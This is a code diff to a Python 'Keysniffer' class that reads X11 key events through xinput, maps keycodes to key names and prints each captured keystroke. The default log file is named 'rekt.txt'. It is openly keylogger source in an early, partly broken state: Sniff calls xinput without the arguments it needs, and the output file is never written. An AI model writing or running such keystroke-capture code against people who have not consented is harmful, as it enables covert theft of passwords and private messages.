@@ -4,12 +4,9 @@ import os
 import re
 
 class Keysniffer():
-        # Dictionary to hold keycode mapping
-        KEYCODES = dict()
-        def __init__(self, xinput_bin='/usr/bin/xinput', keymap=KEYCODES,\
-                        outfile='rekt.txt'):
+        def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
                self.xinput = xinput_bin
-               self.keycodes = keymap
+               self.keycodes = {}
                self.outfile = outfile
                 
         def GetKeyCodes(self):
@@ -32,15 +29,23 @@ class Keysniffer():
                                 pass
                         else:
                                 c1 = str(line[0])
-                                character_re = re.compile('\([0-9A-Za-z]\)')
-                                special_re = re.compile('')
-                                name = str(line[2])
-                                if c1.isnumeric() and regex.match(name):
-                                        self.keycodes[str(c1)] = line[2]
-                        
+                                if len(line) > 4:
+                                        names = [line[2], line[4]]
+                                else:
+                                        names = [line[2]]
+                                if c1.isnumeric():
+                                        self.keycodes[str(c1)] = names
+
+
         def CodeConverter(self, code):
                 print(self.keycodes[str(code)])
 
-        def Sniff():
-                pass
+        def Sniff(self):
+                keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
+                        universal_newlines=True)
+
+                for line in keystream.stdout:
+                        code = str(line).strip().split()
+                        self.CodeConverter(code[1])
+
         
